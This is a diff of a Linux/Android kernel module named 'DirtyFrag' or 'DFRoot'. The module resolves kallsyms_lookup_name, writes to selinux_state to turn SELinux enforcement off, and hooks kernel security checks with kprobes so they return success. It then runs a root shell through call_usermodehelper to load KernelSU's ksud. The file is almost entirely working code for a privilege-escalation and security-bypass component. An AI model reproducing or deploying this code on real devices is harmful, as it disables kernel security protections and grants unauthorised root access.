@@ -1,92 +1,89 @@
 #include <linux/init.h>
 #include <linux/kernel.h>
 #include <linux/module.h>
-#include <linux/printk.h>
-#include <linux/string.h>
-
-MODULE_LICENSE("GPL");
-MODULE_AUTHOR("polygraphene");
-MODULE_DESCRIPTION("DirtyFrag LKM");
-
-extern int sprint_symbol(char *buffer, unsigned long address);
+#include <linux/kprobes.h>
+#include <linux/kmod.h>
+#include <linux/slab.h>
 
 typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
+typedef void *(*umh_setup_t)(const char *path, char **argv, char **envp, gfp_t gfp,
+			     void *init, void *cleanup, void *data);
+typedef int (*umh_exec_t)(void *info, int wait);
 
-static unsigned long sprint_symbol_addr = (unsigned long)&sprint_symbol;
+MODULE_LICENSE("GPL");
+MODULE_DESCRIPTION("DFRoot LKM");
 
-static unsigned long (*kln_addr)(const char *name);
+static int soft_reboot;
+module_param(soft_reboot, int, 0);
 
-#define SCAN_STRIDE	4UL
-#define SCAN_MAX	(4UL * 1024UL * 1024UL / SCAN_STRIDE) /* 1M iters, 4 MB */
-
-static int name_is(const char *buf, const char *want)
-{
-	int i;
-
-	for (i = 0; want[i]; i++) {
-		if (buf[i] != want[i])
-			return 0;
-	}
-	/* exact function start: name must be followed by "+0x0/" */
-    return buf[i] == '+' && buf[i + 1] == '0' && buf[i + 2] == 'x' &&
-	       buf[i + 3] == '0' && buf[i + 4] == '/';
+static unsigned long kprobes_lookup(const char *name) {
+	struct kprobe kp = { .symbol_name = name };
+	unsigned long addr;
+	if (register_kprobe(&kp) < 0) return 0;
+	addr = (unsigned long)kp.addr;
+	unregister_kprobe(&kp);
+	return addr;
 }
 
-static unsigned long scan_one_dir(unsigned long start, int dir)
-{
-	static char buf[256];
-	unsigned long a;
-	unsigned long i;
+static int defex_pre_handler(struct kprobe *p, struct pt_regs *regs) {
+	regs->regs[0] = 0;
+	regs->pc = regs->regs[30];
+	return 1;
+}
 
-	for (i = 0; i < SCAN_MAX; i++) {
-		if (dir < 0) {
-			if (start < (i + 1) * SCAN_STRIDE)
-				break;
-			a = start - (i + 1) * SCAN_STRIDE;
+static struct kprobe kp_user_exec = { .symbol_name = "task_defex_user_exec", .pre_handler = defex_pre_handler };
+static struct kprobe kp_dc_path   = { .symbol_name = "get_dc_target_dpath",  .pre_handler = defex_pre_handler };
+
+static int __nocfi __init dirtyfrag_init(void) {
+	kallsyms_lookup_name_t kln;
+	umh_setup_t umh_setup;
+	umh_exec_t  umh_exec;
+	unsigned long selinux;
+
+	kln = (kallsyms_lookup_name_t)kprobes_lookup("kallsyms_lookup_name");
+	if (!kln) return -EINVAL;
+
+	selinux = kln("selinux_state");
+	if (!selinux) return -EINVAL;
+	WRITE_ONCE(*(bool *)selinux, false);
+	pr_info("dfroot: selinux permissive\n");
+
+	umh_setup = (umh_setup_t)kln("call_usermodehelper_setup");
+	umh_exec  = (umh_exec_t)kln("call_usermodehelper_exec");
+
+	if (umh_setup && umh_exec) {
+		static const char sh[]   = "/system/bin/sh";
+		static char cmd[256];
+		static char *envp[] = { "HOME=/", "PATH=/sbin:/vendor/bin:/system/bin", NULL };
+		static char *argv[] = { (char *)sh, "-c", cmd, NULL };
+		void *info;
+
+		snprintf(cmd, sizeof(cmd),
+			 "%s late-load --package-name me.weishu.kernelsu --ro-partitions%s"
+			 " && touch /dev/dfm0 || touch /dev/dfm1",
+			 "/data/user_de/0/df.root/ksud", soft_reboot ? " --soft-reboot" : "");
+
+		info = umh_setup(sh, argv, envp, GFP_KERNEL, NULL, NULL, NULL);
+		if (info) {
+			struct subprocess_info *si = (struct subprocess_info *)info;
+			int ret;
+			si->path = sh;
+			register_kprobe(&kp_user_exec);
+			register_kprobe(&kp_dc_path);
+			ret = umh_exec(info, UMH_WAIT_PROC);
+			if (kp_user_exec.addr) unregister_kprobe(&kp_user_exec);
+			if (kp_dc_path.addr)   unregister_kprobe(&kp_dc_path);
+			if (ret)
+				pr_err("dfroot: umh_exec failed: %d\n", ret);
+			else
+				pr_info("dfroot: umh_exec ok\n");
 		} else {
-			a = start + (i + 1) * SCAN_STRIDE;
+			pr_err("dfroot: umh_setup returned NULL\n");
 		}
-		memset(buf, 0, sizeof(buf));
-		sprint_symbol(buf, a);
-		if (name_is(buf, "kallsyms_lookup_name"))
-			return a;
-	}
-	return 0;
-}
-
-static int __init dirtyfrag_init(void)
-{
-	char buf[256];
-	unsigned long anchor = sprint_symbol_addr;
-	unsigned long found = 0;
-	unsigned long sstate;
-
-	/* Self-check: the anchor must resolve to sprint_symbol itself. */
-	memset(buf, 0, sizeof(buf));
-	sprint_symbol(buf, anchor);
-	if (!name_is(buf, "sprint_symbol")) {
-		pr_err("dirtyfrag: anchor self-check failed (%s), aborting\n", buf);
-		return -ENODEV;
+	} else {
+		pr_err("dfroot: umh symbols missing (setup=%px exec=%px)\n", umh_setup, umh_exec);
 	}
 
-	/* Down first (mirrors original), then up for layout robustness. */
-	found = scan_one_dir(anchor, -1);
-	if (!found)
-		found = scan_one_dir(anchor, +1);
-	if (!found) {
-		pr_err("dirtyfrag: kallsyms_lookup_name not in scan window, aborting\n");
-		return -ENODEV;
-	}
-	kln_addr = (kallsyms_lookup_name_t)found;
-	sstate = kln_addr("selinux_state");
-	if (!sstate) {
-		pr_err("dirtyfrag: selinux_state unresolved, aborting\n");
-		return -ENODEV;
-	}
-	/* struct selinux_state.enforcing is the first field; one NUL byte. */
-	*(volatile unsigned char *)sstate = 0;
-
-	pr_info("dirtyfrag: Successfully set selinux permissive.\n");
 	/* Return random error to unload module. */
 	return -E2BIG;
 }
